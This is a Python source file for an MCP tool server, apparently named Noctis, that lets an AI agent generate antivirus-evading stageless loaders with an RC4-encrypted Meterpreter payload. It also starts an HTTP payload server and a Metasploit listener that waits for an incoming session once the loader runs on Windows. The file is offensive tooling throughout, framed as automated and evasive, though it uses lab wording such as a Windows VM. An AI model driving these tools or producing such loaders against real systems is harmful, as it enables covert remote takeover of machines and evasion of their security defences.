#!/usr/bin/env python3
"""
Noctis MCP - Stageless Loader MCP Tools
Fully automated AV-bypassing stageless loaders
"""
import sys
import requests
from pathlib import Path

try:
    from fastmcp import FastMCP
except ImportError:
    print("[!] FastMCP not installed: pip install fastmcp")
    sys.exit(1)

mcp = FastMCP("Noctis-MCP")
SERVER_URL = "http://localhost:8888"


@mcp.tool()
def noctis_generate_stageless_loader(
    lhost: str,
    lport: int = 4444,
    http_port: int = 8080,
    auto_start_servers: bool = True
) -> str:
    """
    Generate complete stageless loader system and optionally start servers.

    This is the MAIN tool - does EVERYTHING automatically!
    User only needs to run the loader.exe on Windows.

    Args:
        lhost: Your Kali IP address (e.g., "192.168.1.56")
        lport: Meterpreter listener port (default: 4444)
        http_port: HTTP server port for payload delivery (default: 8080)
        auto_start_servers: Automatically start HTTP server and MSF listener (default: True)

    Returns:
        Complete status with all generated files and running services
    """
    try:
        # Step 1: Generate loader system
        response = requests.post(
            f"{SERVER_URL}/api/generate_stageless_loader",
            json={
                'lhost': lhost,
                'lport': lport,
                'http_port': http_port
            },
            timeout=120
        )

        if response.status_code != 200:
            data = response.json()
            return f"ERROR: Generation failed\n{data.get('error', response.text)}"

        data = response.json()
        if not data.get('success'):
            return f"ERROR: {data.get('error')}"

        output = []
        output.append("=" * 70)
        output.append("  [OK] STAGELESS LOADER GENERATED!")
        output.append("=" * 70)
        output.append("")
        output.append(f"LHOST: {data['lhost']}")
        output.append(f"LPORT: {data['lport']}")
        output.append(f"HTTP Port: {data['http_port']}")
        output.append(f"Output: {data['work_dir']}")
        output.append("")
        output.append("Generated files:")
        output.append(f"  stageless_loader.exe ({data['loader_size']:,} bytes) - CLEAN, NO MSFVenom!")
        output.append(f"  payload.enc ({data['payload_size']:,} bytes) - RC4 encrypted")
        output.append(f"  start_server.sh - HTTP server script")
        output.append(f"  start_listener.sh - Metasploit listener script")
        output.append("")

        # Step 2: Auto-start servers if requested
        if auto_start_servers:
            output.append("=" * 70)
            output.append("  [STARTING] STARTING SERVERS AUTOMATICALLY...")
            output.append("=" * 70)
            output.append("")

            # Start HTTP server
            http_response = requests.post(
                f"{SERVER_URL}/api/start_http_server",
                json={'port': http_port},
                timeout=30
            )

            if http_response.status_code == 200:
                http_data = http_response.json()
                if http_data.get('success'):
                    output.append(f"[OK] HTTP Server: RUNNING on port {http_data['port']}")
                    output.append(f"   Serving: {http_data['payload_url']}")
                    output.append(f"   PID: {http_data['pid']}")
                else:
                    output.append(f"[WARNING]  HTTP Server: {http_data.get('error')}")
            else:
                output.append(f"[WARNING]  HTTP Server: Failed to start")

            output.append("")

            # Start Metasploit listener
            msf_response = requests.post(
                f"{SERVER_URL}/api/start_msf_listener",
                json={'lhost': lhost, 'lport': lport},
                timeout=30
            )

            if msf_response.status_code == 200:
                msf_data = msf_response.json()
                if msf_data.get('success'):
                    output.append(f"[OK] Metasploit Listener: RUNNING")
                    output.append(f"   Listening: {msf_data['lhost']}:{msf_data['lport']}")
                    output.append(f"   Payload: {msf_data['payload']}")
                    output.append(f"   PID: {msf_data['pid']}")
                else:
                    output.append(f"[WARNING]  Metasploit Listener: {msf_data.get('error')}")
            else:
                output.append(f"[WARNING]  Metasploit Listener: Failed to start")

            output.append("")

        output.append("=" * 70)
        output.append("  [READY] READY TO TEST!")
        output.append("=" * 70)
        output.append("")
        output.append("Next steps:")
        output.append(f"  1. Copy {data['loader_path']} to Windows VM")
        output.append(f"  2. Run the loader on Windows")
        output.append(f"  3. Watch Metasploit for incoming session!")
        output.append("")
        output.append("To stop servers:")
        output.append("  - noctis_stop_servers()")
        output.append("")
        output.append("=" * 70)

        return "\n".join(output)

    except requests.exceptions.ConnectionError:
        return f"ERROR: Server not running. Start with:\n  python3 server/noctis_server.py"
    except Exception as e:
        return f"ERROR: {str(e)}"


@mcp.tool()
def noctis_check_status() -> str:
    """
    Check complete system status (files + running processes).

    Returns:
        Status of all files and running servers
    """
    try:
        # Check file status
        file_response = requests.post(
            f"{SERVER_URL}/api/check_status",
            json={},
            timeout=30
        )

        # Check process status
        process_response = requests.get(
            f"{SERVER_URL}/api/process_status",
            timeout=30
        )

        output = []
        output.append("=" * 70)
        output.append("  NOCTIS STAGELESS LOADER - SYSTEM STATUS")
        output.append("=" * 70)
        output.append("")

        # File status
        if file_response.status_code == 200:
            file_data = file_response.json()
            if file_data.get('success'):
                output.append(f"[FILES] Files: {file_data['work_dir']}")
                output.append("")

                for filename, info in file_data['files'].items():
                    if info['exists']:
                        size = info['size']
                        desc = info['description']
                        output.append(f"  [+] {filename:25s} {size:>10,} bytes - {desc}")
                    else:
                        desc = info['description']
                        output.append(f"  [-] {filename:25s} MISSING - {desc}")

                output.append("")
                if file_data['all_ready']:
                    output.append("[OK] All files present")
                else:
                    output.append("[FAILED] Missing files - run noctis_generate_stageless_loader()")

        output.append("")

        # Process status
        if process_response.status_code == 200:
            proc_data = process_response.json()
            if proc_data.get('success'):
                output.append("[SERVICES] Running Services:")
                output.append("")

                http_status = proc_data['processes']['http_server']
                if http_status['running']:
                    output.append(f"  [OK] HTTP Server: RUNNING (PID: {http_status['pid']})")
                else:
                    output.append(f"  [NOT RUNNING] HTTP Server: NOT RUNNING")

                msf_status = proc_data['processes']['msf_listener']
                if msf_status['running']:
                    output.append(f"  [OK] MSF Listener: RUNNING (PID: {msf_status['pid']})")
                else:
                    output.append(f"  [NOT RUNNING] MSF Listener: NOT RUNNING")

        output.append("")
        output.append("=" * 70)

        return "\n".join(output)

    except requests.exceptions.ConnectionError:
        return f"ERROR: Server not running. Start with:\n  python3 server/noctis_server.py"
    except Exception as e:
        return f"ERROR: {str(e)}"


@mcp.tool()
def noctis_start_servers(lhost: str, lport: int = 4444, http_port: int = 8080) -> str:
    """
    Start HTTP server and Metasploit listener.

    Args:
        lhost: Your Kali IP
        lport: Meterpreter listener port (default: 4444)
        http_port: HTTP server port (default: 8080)

    Returns:
        Status of started servers
    """
    try:
        output = []
        output.append("=" * 70)
        output.append("  [STARTING] STARTING SERVERS...")
        output.append("=" * 70)
        output.append("")

        # Start HTTP server
        http_response = requests.post(
            f"{SERVER_URL}/api/start_http_server",
            json={'port': http_port},
            timeout=30
        )

        if http_response.status_code == 200:
            http_data = http_response.json()
            if http_data.get('success'):
                output.append(f"[OK] HTTP Server: RUNNING")
                output.append(f"   Port: {http_data['port']}")
                output.append(f"   Payload URL: {http_data['payload_url']}")
                output.append(f"   PID: {http_data['pid']}")
            else:
                output.append(f"[FAILED] HTTP Server: {http_data.get('error')}")
        else:
            output.append(f"[FAILED] HTTP Server: Failed to start")

        output.append("")

        # Start Metasploit listener
        msf_response = requests.post(
            f"{SERVER_URL}/api/start_msf_listener",
            json={'lhost': lhost, 'lport': lport},
            timeout=30
        )

        if msf_response.status_code == 200:
            msf_data = msf_response.json()
            if msf_data.get('success'):
                output.append(f"[OK] Metasploit Listener: RUNNING")
                output.append(f"   Listening: {msf_data['lhost']}:{msf_data['lport']}")
                output.append(f"   Payload: {msf_data['payload']}")
                output.append(f"   PID: {msf_data['pid']}")
            else:
                output.append(f"[FAILED] Metasploit Listener: {msf_data.get('error')}")
        else:
            output.append(f"[FAILED] Metasploit Listener: Failed to start")

        output.append("")
        output.append("=" * 70)

        return "\n".join(output)

    except requests.exceptions.ConnectionError:
        return f"ERROR: Server not running. Start with:\n  python3 server/noctis_server.py"
    except Exception as e:
        return f"ERROR: {str(e)}"


@mcp.tool()
def noctis_stop_servers() -> str:
    """
    Stop all running servers (HTTP + Metasploit).

    Returns:
        Status of stopped servers
    """
    try:
        output = []
        output.append("=" * 70)
        output.append("  [STOPPING] STOPPING SERVERS...")
        output.append("=" * 70)
        output.append("")

        # Stop HTTP server
        http_response = requests.post(
            f"{SERVER_URL}/api/stop_http_server",
            json={},
            timeout=30
        )

        if http_response.status_code == 200:
            http_data = http_response.json()
            if http_data.get('success'):
                output.append(f"[OK] HTTP Server: STOPPED")
            else:
                output.append(f"[WARNING]  HTTP Server: {http_data.get('error')}")
        else:
            output.append(f"[FAILED] HTTP Server: Failed to stop")

        output.append("")

        # Stop Metasploit listener
        msf_response = requests.post(
            f"{SERVER_URL}/api/stop_msf_listener",
            json={},
            timeout=30
        )

        if msf_response.status_code == 200:
            msf_data = msf_response.json()
            if msf_data.get('success'):
                output.append(f"[OK] Metasploit Listener: STOPPED")
            else:
                output.append(f"[WARNING]  Metasploit Listener: {msf_data.get('error')}")
        else:
            output.append(f"[FAILED] Metasploit Listener: Failed to stop")

        output.append("")
        output.append("=" * 70)

        return "\n".join(output)

    except requests.exceptions.ConnectionError:
        return f"ERROR: Server not running. Start with:\n  python3 server/noctis_server.py"
    except Exception as e:
        return f"ERROR: {str(e)}"


if __name__ == "__main__":
    print("[*] Noctis MCP Starting...")
    print("[*] Server URL:", SERVER_URL)
    print("[*] Tools: Fully Automated Stageless Loader")
    mcp.run(transport='stdio')
